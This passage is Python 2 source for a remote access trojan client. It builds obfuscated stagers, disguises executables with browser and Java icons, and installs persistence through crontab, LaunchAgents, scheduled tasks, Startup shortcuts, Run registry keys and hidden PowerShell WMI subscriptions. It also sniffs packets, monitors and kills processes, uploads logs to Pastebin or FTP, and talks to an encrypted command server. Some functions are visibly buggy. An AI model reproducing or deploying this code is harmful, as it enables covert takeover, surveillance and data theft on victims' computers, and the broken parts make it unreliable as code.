                    code = ['#!/usr/bin/python',"from __future__ import print_function", self._server_resource('stager code'), "if __name__=='__main__':", "\t_debug=bool('--debug' in sys.argv or 'debug' in sys.argv)", '\tmain(config="{}")'.format(json.loads(self._server_resource('stager config')).get('r'))]
                    data = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile('\n'.join(code), '', 'exec')), 9))))
                    path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
                    with file(path, 'w') as fp:
                        fp.write(data)
                    return path
                else:
                    return "Error: dropper resource missing - code\nUse 'payload help' for usage details"
            else:
                return "Error: dropper resource missing - config\nUse 'payload help' for usage details"
        except Exception as e:
            return'{} error: {}'.format(self._payload_stager.func_name, str(e))


    @config(platforms=['win32','linux2'])
    def _payload_executable(self, **kwargs):
        try:
            path = kwargs.get('path')
            if not path:
                return "Error: missing keyword argument 'path'"
            if not os.path.exists(path):
                return "Error: file '%s' not found" % path
            if sys.platform not in ('win32','linux2','darwin'):
                return "Cannot compile executables compatible with %s platforms" % sys.platform
            os.chdir(os.path.dirname(path))
            orig    = os.getcwd()
            pyname  = os.path.basename(path)
            name    = os.path.splitext(pyname)[0]
            dist    = os.path.dirname(path)
            key     = self._get_random_var(16)
            apps    = [i for i in ['flash','java','chrome','firefox','safari','explorer','edge','word','excel','pdf'] if i in name]
            appicon = self._server_resource('resource icon %s' % apps[0]) if len(apps) else self._server_resource('resource icon java')
            icon    = self.wget(appicon) if os.name != 'nt' else os.path.splitdrive(self.wget(appicon))[1].replace('\\','/')
            pkgs    = list(set([i.strip().split()[1] for i in open(path).read().splitlines() if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in urllib.urlopen(json.loads(self._server_resource('stager config')).get('w')).read().splitlines() if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
            spec    = self._server_resource('resource stager spec').replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
            fspec   = os.path.join(dist, name + '.spec')
            with file(fspec, 'w') as fp:
                fp.write(spec)
            make  = subprocess.Popen('%s -m PyInstaller %s' % (sys.executable, fspec), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
            exe   = os.path.join(os.path.join(dist, 'dist'), name + '.exe' if os.name is 'nt' else name)
            if 'posix' in os.name:
                os.chmod(exe, 755)
            _  = map(self._get_delete, (path, fspec, os.path.join(dist, 'build')))
            os.chdir(orig)
            return exe
        except Exception as e3:
            return'{} error: {}'.format(self._payload_executable.func_name, str(e3))


    @config(platforms=['darwin'])
    def _payload_application(self, **kwargs):
        try:
            if not kwargs.get('path'):
                return "Error: missing keyword argument 'path'"
            filename        = kwargs.get('path')
            iconName        = kwargs.get('icon') if os.path.isfile(str(kwargs.get('icon'))) else self._server_resource('resource icon %s.png' % random.choice(['flash','java','chrome','firefox']))
            iconFile        = self.wget(iconName)
            version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
            baseName        = os.path.basename(filename)
            bundleName      = os.path.splitext(baseName)[0]
            pkgPath         = os.path.join(basePath, 'PkgInfo')
            appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
            basePath        = os.path.join(appPath, 'Contents')
            distPath 	    = os.path.join(basePath, 'MacOS')
            rsrcPath        = os.path.join(basePath, 'Resources')
            plistPath       = os.path.join(rsrcPath, 'Info.plist')
            iconPath        = os.path.basename(iconFile)
            executable      = os.path.join(distPath, filename)
            bundleVersion   = ' '.join(bundleName, version)
            bundleIdentity  = 'com.' + bundleName
            infoPlist       = urllib2.urlopen(self._server_resource('resource plist')).read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
            os.makedirs(distPath)
            os.mkdir(rsrcPath)
            with file(pkgPath, "w") as fp:
                fp.write("APPL????")
            with file(plistPath, "w") as fw:
                fw.write(infoPlist)
            os.rename(filename, os.path.join(distPath, baseName))
            _ = os.popen('chmod +x %s' % executable).read()
            return appPath
        except Exception as e:
            return "{} error: {}".format(self._payload_application.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_add_hidden_file(self, *args, **kwargs):
        if len(self._payload):
            value = random.choice(self._payload)
            if value and os.path.isfile(value):
                try:
                    if os.name is 'nt':
                        path = value
                        hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
                    else:
                        dirname, basename = os.path.split(value)
                        path = os.path.join(dirname, '.' + basename)
                        hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
                    return True if hide else False
                except Exception as e:
                    return (False, 'Adding hidden file error: {}'.format(str(e)))
            else:
                return (False, "File '{}' not found".format(value))
        else:
            self._payload.append(self._payload_stager())
            return self._persistence_add_hidden_file()


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_remove_hidden_file(self, *args, **kwargs):
        try:
            if self.persistence.methods['hidden_file']['established']:
                filename = self.persistence.methods['hidden_file']['result']
                if os.path.isfile(filename):
                    try:
                        unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                        if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                            return (False, None)
                    except Exception as e1:
                        self.debug('{} error: {}'.format(self._persistence_remove_hidden_file.func_name, str(e1)))
        except Exception as e2:
            self.debug('{} error: {}'.format(self._persistence_remove_hidden_file.func_name, str(e2)))
        return (self.persistence.methods['hidden_file']['established'], self.persistence.methods['hidden_file']['result'])


    @config(platforms=['linux2'])
    def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
        try:
            if len(self._payload):
                value = random.choice(self._payload)
                if value and os.path.isfile(value):
                    if not os.path.isdir('/var/tmp'):
                        os.makedirs('/var/tmp')
                    path = os.path.join('/var/tmp','.' + os.path.splitext(name)[0] + os.path.splitext(value)[1])
                    with file(name, 'w') as copy:
                        copy.write(open(value).read())
                    if not self.persistence.methods['crontab_job']['established']:
                        for user in ['root', os.getenv('USERNAME', os.getenv('NAME'))]:
                            try:
                                task = "0 */6 * * * {} {}".format(60/minutes, user, path)
                                with open('/etc/crontab', 'r') as fp:
                                    data = fp.read()
                                if task not in data:
                                    with file('/etc/crontab', 'a') as fd:
                                        fd.write('\n' + task + '\n')
                                return (True, path)
                            except Exception as e:
                                self.debug("{} error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                                self._get_delete(path)
                    else:
                        return (True, path)
            else:
                self._payload.append(self._payload_stager())
                return self._persistence_add_crontab_job()
        except Exception as e:
            self.debug("{} error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
            self._get_delete(path)
        return (False, None)


    @config(platforms=['linux2'])
    def _persistence_remove_crontab_job(self, name='flashplayer'):
        try:
            with open('/etc/crontab','r') as fp:
                lines = [i.rstrip() for i in fp.readlines()]
                for line in lines:
                    if name in line:
                        _ = lines.pop(line, None)
            with open('/etc/crontab', 'a+') as fp:
                fp.write('\n'.join(lines))
            return (False, None)
        except Exception as e:
            self.debug(str(e))
        return (self.persistence.methods['hidden_file']['established'], self.persistence.methods['hidden_file']['result'])


    @config(platforms=['darwin'])
    def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
        try:
            if len(self._payload):
                value = random.choice(self._payload)
                if value and os.path.isfile(value):
                    code    = self._server_resource('resource bash')
                    label   = name
                    if not os.path.exists('/var/tmp'):
                        os.makedirs('/var/tmp')
                    fpath   = '/var/tmp/.{}.sh'.format(name)
                    bash    = code.replace('__LABEL__', label).replace('__FILE__', value)
                    with file(fpath, 'w') as fileobj:
                        fileobj.write(bash)
                    bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                    time.sleep(1)
                    launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                    if os.path.isfile(launch_agent):
                        os.remove(fpath)
                        return (True, launch_agent)
            else:
                self._payload.append(self._payload_stager())
                return self._persistence_add_launch_agent()
        except Exception as e2:
            self.debug('Error: {}'.format(str(e2)))
        return (False, None)


    @config(platforms=['darwin'])
    def _persistence_remove_launch_agent(self, name='com.apple.update.manager'):
        try:
            if self.persistence.methods['launch_agent'].get('established'):
                launch_agent = self.persistence['launch_agent'].get('result')
                if os.path.isfile(launch_agent):
                    self._get_delete(launch_agent)
                    return (False, None)
        except Exception as e:
            self.debug("{} error: {}".format(self._persistence_remove_launch_agent.func_name, str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_add_scheduled_task(self, name='Java-Update-Manager'):
        if len(self._payload):
            value = random.choice(self._payload)
            if value and os.path.isfile(value):
                tmpdir      = os.path.expandvars('%TEMP%')
                task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
                if not os.path.isfile(task_run):
                    with file(task_run, 'w') as copy:
                        copy.write(open(value).read())
                try:
                    result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, task_run), shell=True)
                    if 'SUCCESS' in result:
                        return (True, result.replace('"', ''))
                except Exception as e:
                    self.debug('Add scheduled task error: {}'.format(str(e)))
            return (False, None)
        else:
            self._payload.append(self._payload_stager())
            return self._persistence_add_scheduled_task()


    @config(platforms=['win32'])
    def _persistence_remove_scheduled_task(self, *args, **kwargs):
        if self.persistence.methods['scheduled_task'].get('established'):
            value = self.persistence.methods['scheduled_task'].get('result')
            try:
                 if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
                     return (False, None)
            except: pass
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_add_startup_file(self, name='Java-Update-Manager'):
        if len(self._payload):
            value = random.choice(self._payload)
            if value and os.path.isfile(value):
                try:
                    appdata = os.path.expandvars("%AppData%")
                    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                    if not os.path.exists(startup_dir):
                        os.makedirs(startup_dir)
                    startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                        with file(startup_file, 'w') as fp:
                            fp.write(content)
                    return (True, startup_file)
                except Exception as e:
                    self.debug('{} error: {}'.format(self._persistence_add_startup_file.func_name, str(e)))
            return (False, None)
        else:
            self._payload.append(self._payload_stager())
            return self._persistence_add_startup_file()


    @config(platforms=['win32'])
    def _persistence_remove_startup_file(self, *args, **kwargs):
        if self.persistence.methods['startup_file'].get('established'):
            value = self.persistence.methods['startup_file'].get('result')
            if value and os.path.isfile(value):
                if os.name != 'nt':
                    return (False, None)
                appdata      = os.path.expandvars("%AppData%")
                startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                startup_file = os.path.join(startup_dir, value) + '.eu.url'
                if os.path.exists(startup_file):
                    self._get_delete(startup_file)
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_add_registry_key(self, name='Java-Update-Manager'):
        if len(self._payload):
            value = random.choice(self._payload)
            if value and os.path.isfile(value):
                try:
                    self._get_new_registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, value)
                    return (True, name)
                except Exception as e:
                    self.debug('{} error: {}'.format(self._persistence_add_registry_key.func_name, str(e)))
            return (False, None)
        else:
            self._payload.append(self._payload_stager())
            return self._persistence_add_registry_key()


    @config(platforms=['win32'])
    def _persistence_remove_registry_key(self, name='Java-Update-Manager'):
        if self.persistence.methods['registry_key'].get('established'):
            value = self.persistence.methods['registry_key'].get('result')
            try:
                key = OpenKey(_winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_ALL_ACCESS)
                _winreg.DeleteValue(key, name)
                _winreg.CloseKey(key)
                return (False, None)
            except: pass
        return (self.persistence.methods['registry_key']['established'], self.persistence.methods['registry_key']['result'])


    @config(platforms=['win32'])
    def _persistence_add_powershell_wmi(self, command=None, task_name='Java-Update-Manager'):
        try:
            cmd_line  = ""
            if len(self._payload):
                value = random.choice(self._payload)
                if value and os.path.isfile(value):
                    cmd_line = 'start /b /min {}'.format(value)
                elif command:
                    cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
                if cmd_line:
                    startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
                    powershell = self._server_resource('resource powershell').replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
                    self._get_powershell_exec(powershell)
                    code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % task_name
                    result = self._get_powershell_exec(code)
                    if task_name in result:
                        return (True, result)
                return (False, None)
            else:
                self._payload.append(self._payload_stager())
                return self._persistence_add_powershell_wmi()
        except Exception as e:
            self.debug('{} error: {}'.format(self._persistence_add_powershell_wmi.func_name, str(e)))


    @config(platforms=['win32'])
    def _persistence_remove_powershell_wmi(self, task_name='Java-Update-Manager'):
        if self.persistence.methods['powershell_wmi'].get('established'):
            try:
                code = """
                Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject""".replace('[NAME]', task_name)
                result = self._get_powershell_exec(code)
                if not result:
                    return (False, None)
            except: pass
        return (self.persistence.methods['powershell_wmi']['established'], self.persistence.methods['powershell_wmi']['result'])


    def _packetsniffer_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src = udp_hdr[0]
            dst = udp_hdr[1]
            length = udp_hdr[2]
            chksum = udp_hdr[3]
            data = data[8:]
            self.packetsniffer.capture.append('|================== UDP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|================================================|')
            return data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('UDP', str(e)))


    def _packetsniffer_tcp_header(self, recv_data):
        try:
            tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num = tcp_hdr[2]
            ack_num = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]
            self.packetsniffer.capture.append('|================== TCP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniffer.capture.append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('TCP', str(e)))


    def _packetsniffer_ip_header(self, data):
        try:
            ip_hdr = struct.unpack('!6H4s4s', data[:20])
            ver = ip_hdr[0] >> 12
            ihl = (ip_hdr[0] >> 8) & 0x0f
            tos = ip_hdr[0] & 0x00ff
            tot_len = ip_hdr[1]
            ip_id = ip_hdr[2]
            flags = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum = ip_hdr[5]
            src = socket.inet_ntoa(ip_hdr[6])
            dest = socket.inet_ntoa(ip_hdr[7])
            data = data[20:]
            self.packetsniffer.capture.append('|================== IP HEADER ===================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniffer.capture.append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('IP', str(e)))


    def _packetsniffer_eth_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto = eth_hdr[2] >> 8
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|================== ETH HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniffer.capture.append('|================================================|')
            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))


    def _ps_list(self, *args, **kwargs):
        try:
            output  = {}
            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
                pid = i.split()[1 if os.name is 'nt' else 0]
                exe = i.split()[0 if os.name is 'nt' else -1]
                if exe not in output:
                    if len(json.dumps(output)) < 48000:
                        output.update({pid: exe})
                    else:
                        break
            return json.dumps(output)
        except Exception as e:
            self.debug("{} error: {}".format(self._ps_list.func_name, str(e)))


    def _ps_search(self, arg):
        try:
            if not isinstance(arg, str) or not len(arg):
                return "usage: process search [PID/name]"
            output  = {}
            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
                pid = i.split()[1 if os.name is 'nt' else 0]
                exe = i.split()[0 if os.name is 'nt' else -1]
                if arg in exe:
                    if len(json.dumps(output)) < 48000:
                        output.update({pid: exe})
                    else:
                        break
            return json.dumps(output)
        except Exception as e:
            self.debug("{} error: {}".format(self._ps_search.func_name, str(e)))


    def _ps_kill(self, arg):
        try:
            output  = {}
            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
                pid = i.split()[1 if os.name is 'nt' else 0]
                exe = i.split()[0 if os.name is 'nt' else -1]
                if str(arg).isdigit() and int(arg) == int(pid):
                    try:
                        _ = os.popen('taskkill /pid %s /f' % pid if os.name is 'nt' else 'kill -9 %s' % pid).read()
                        output.update({str(arg): "killed"})
                    except:
                        output.update({str(arg): "not found"})
                else:
                    try:
                        _ = os.popen('taskkill /im %s /f' % exe if os.name is 'nt' else 'kill -9 %s' % exe).read()
                        output.update({str(p.name()): "killed"})
                    except Exception as e:
                        Client.debug(str(e))
                return json.dumps(output)
        except Exception as e:
            self.debug("{} error: {}".format(self._ps_kill.func_name, str(e)))


    def _ps_monitor(self, arg):
        try:
            if not len(self.ps.buffer.getvalue()):
                self.ps.buffer.write("Time, User , Executable, PID, Privileges\n")
            pythoncom.CoInitialize()
            c = wmi.WMI()
            process_watcher = c.Win32_Process.watch_for("creation")
            while True:
                try:
                    new_process = process_watcher()
                    proc_owner  = new_process.GetOwner()
                    proc_owner  = "%s\\%s" % (proc_owner[0],proc_owner[2])
                    create_date = new_process.CreationDate
                    executable  = new_process.ExecutablePath
                    pid         = new_process.ProcessId
                    parent_pid  = new_process.ParentProcessId
                    output      = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
                    if not keyword:
                        self.ps.buffer.write(output)
                    else:
                        if keyword in output:
                            self.ps.buffer.write(output)
                except Exception as e1:
                    self.debug("{} error: {}".format(self._ps_monitor.func_name, str(e1)))
                if self._abort:
                    break
        except Exception as e2:
            self.debug("{} error: {}".format(self._ps_monitor.func_name, str(e2)))


    def _ps_logger(self, *args, **kwargs):
        try:
            while True:
                if self.ps.buffer.tell() > self.ps.max_bytes:
                    try:
                        result  = self._upload_pastebin(self.ps.buffer) if 'ftp' not in args else self._Upload_ftp(self.ps.buffer)
                        self._task_save('process monitor', result)
                        self.ps.buffer.reset()
                    except Exception as e:
                        self.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))
                elif self._abort:
                    break
                else:
                    time.sleep(5)
        except Exception as e:
            self.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))


    def _ps_monitor_start(self, *args, **kwargs):
        try:
            if self._ps_monitor.func_name not in self._workers or not self._workers.get(self._ps_monitor.func_name).is_alive():
                self._workers[self._ps_monitor.func_name] = threading.Thread(target=self._ps_monitor, args=args, kwargs=kwargs, name=time.time())
                self._workers[self._ps_monitor.func_name].daemon = True
                self._workers[self._ps_monitor.func_name].start()
            if self._ps_logger.func_name not in self._workers or not self._workers.get(self._ps_logger.func_name).is_alive():
                self._workers[self._ps_logger.func_name] = threading.Thread(target=self._ps_logger, name=time.time())
                self._workers[self._ps_logger.func_name].daemon = True
                self._workers[self._ps_logger.func_name].start()
            return "Monitoring process creation and uploading logs"
        except Exception as e:
            self.debug("{} error: {}".format(self._ps_monitor.func_name, str(e)))


    def _server_send(self, **kwargs):
        try:
            if self._flags['connection'].wait(timeout=1.0):
                if kwargs.get('result'):
                    buff = kwargs.get('result')
                    kwargs.update({'result': buff[:48000]})
                data = self._aes_encrypt(json.dumps(kwargs), self._session['key'])
                self._session['socket'].send(struct.pack('L', len(data)) + data)
                if len(buff[48000:]):
                    kwargs.update({'result': buff[48000:]})
                    return self._server_send(**kwargs)
            else:
                self.debug("connection timed out")
        except Exception as e:
            self.debug('{} error: {}'.format(self._server_send.func_name, str(e)))


    def _server_recv(self, sock=None):
        if not sock:
            sock = self._session['socket']
        header_size = struct.calcsize('L')
        header = sock.recv(header_size)
        msg_len = struct.unpack('L', header)[0]
        data = ''
        while len(data) < msg_len:
            try:
                data += sock.recv(1)
            except (socket.timeout, socket.error):
                break
        if data and bytes(data):
            try:
                text = self._aes_decrypt(data, self._session['key'])
                task = json.loads(text)
                return task
            except Exception as e2:
                self.debug('{} error: {}'.format(self._server_recv.func_name, str(e2)))


    def _server_addr(self, *args, **kwargs):
        ip   = socket.gethostbyname(socket.gethostname())
        port = kwargs.get('port') if ('port' in kwargs and str(kwargs.get('port')).isdigit()) else 1337
        try:
            if not kwargs.get('debug'):
                if 'config' in kwargs:
                    url, api = urllib.urlopen(kwargs.get('config')).read().splitlines()
                    req = urllib2.Request(url)
                    req.headers = {'API-Key': api}
                    res = urllib2.urlopen(req).read()
                    try:
                        ip  = json.loads(res)['main_ip']
                        if not self._get_if_ipv4(ip):
                            self.debug("{} returned invalid IPv4 address: '{}'".format(self._get_server_addr.func_name, str(ip)))
                    except Exception as e1:
                        self.debug("{} error: {}".format(self._server_addr.func_name, str(e1)))
                else:
                    self.debug("{} error: missing API resources for finding active server".format(self._server_addr.func_name))
        except Exception as e2:
            self.debug("{} error: {}".format(self._server_addr.func_name, str(e2)))
            return self._get_restart(self._server_addr.func_name)
        self.debug("Connecting to {}:{}...".format(ip, port))
        return ip, port


    def _server_connect(self, **kwargs):
        try:
            host, port = self._server_addr(**kwargs)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.setblocking(True)
            self._flags['connection'].set()
            return sock
        except Exception as e:
            self.debug("{} error: {}".format(self._server_connect.func_name, str(e)))
            return self._get_restart(self._server_connect.func_name)


    @threaded
    def _server_prompt(self, *args, **kwargs):
        self._flags['prompt'].set()
        while True:
            try:
                self._flags['prompt'].wait()
                self._server_send(**{'id': '0'*64, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                self._flags['prompt'].clear()
            except Exception as e:
                self.debug("{} error: {}".format(self.prompt.func_name, str(e)))
                self._flags['prompt'].clear()


    def _server_resource(self, resource):
        if self._flags['connection'].wait(timeout=3.0):
            self.debug('Requesting resource: %s' % resource)
            self._server_send(**{"request": resource, "client": self._sysinfo["id"], "session": self._session["id"], "result": ""})
            response = self._server_recv()
            if isinstance(response, dict) and response.get("result"):
                return response.get('result')
            else:
                self.debug("Failed to retreive requested resource '%s'" % resource)
        else:
            return self._get_restart(self._session_task.func_name)


    def _server_task(self, **kwargs):
        if self._flags['connection'].wait(timeout=3.0):
            self.debug('Submitting results for task ID: %s' % task['id'])
            self._server_send(**{"request": resource, "client": self._sysinfo["id"], "session": self._session["id"], "result": ""})
            response = self._server_recv()
            if isinstance(response, dict) and response.get("result"):
                return response.get('result')
            else:
                self.debug("Failed to submit task ID: %s" % task['id'])
        else:
            self.debug("Connection timed out...")
            return self._get_restart(self._session_task.func_name)


    def _session_id(self):
        try:
            if self._flags['connection'].wait(timeout=3.0):
                self._session['socket'].sendall(self._aes_encrypt(json.dumps(self._sysinfo), self._session['key']) + '\n')
                buf      = ""
                attempts = 1
                while '\n' not in buf:
                    try:
                        buf += self._session['socket'].recv(1024)
                    except (socket.error, socket.timeout):
                        if attempts <= 3:
                            self.debug('Attempt %d failed - no Session ID received from server\nRetrying...' % attempts)
                            attempts += 1
                            continue
                        else:
                            break
                if buf:
                    session = self._aes_decrypt(buf.rstrip(), self._session['key']).strip().rstrip()
                    self._session['id'] = self._sysinfo['session'] = session
                    return session
            else:
                self.debug("{} timed out".format(self._session_id.func_name))
        except Exception as e:
            self.debug("{} error: {}".format(self._session_id.func_name, str(e)))
        return self._get_restart(self._session_id.func_name)


    def _session_key(self):
        try:
            if self._flags['connection'].wait(timeout=3.0):
                g  = 2
                p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
                a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
                xA = pow(g, a, p)
                self._session['socket'].send(Crypto.Util.number.long_to_bytes(xA))
                xB = Crypto.Util.number.bytes_to_long(self._session['socket'].recv(256))
                x  = pow(xB, a, p)
                return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
            else:
                self.debug("{} timed out".format(self._session_key.func_name))
        except Exception as e:
            self.debug("{} error: {}\nRestarting in 5 seconds...".format(self._session_key.func_name, str(e)))
        return self._get_restart(self._session_key.func_name)


    def _task_save(self, task, result):
        try:
            task_id = Crypto.Hash.MD5.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
            self._results[time.ctime()] = {"id": task_id, "client": self._sysinfo["id"], "session": self._session["id"], "result": result}
        except Exception as e:
            result  = "{} error: {}".format(self._task_save.func_name, str(e))

    def _task_threader(self):
        try:
            while True:
                try:
                    method, task = self._queue.get_nowait()
                    method(task)
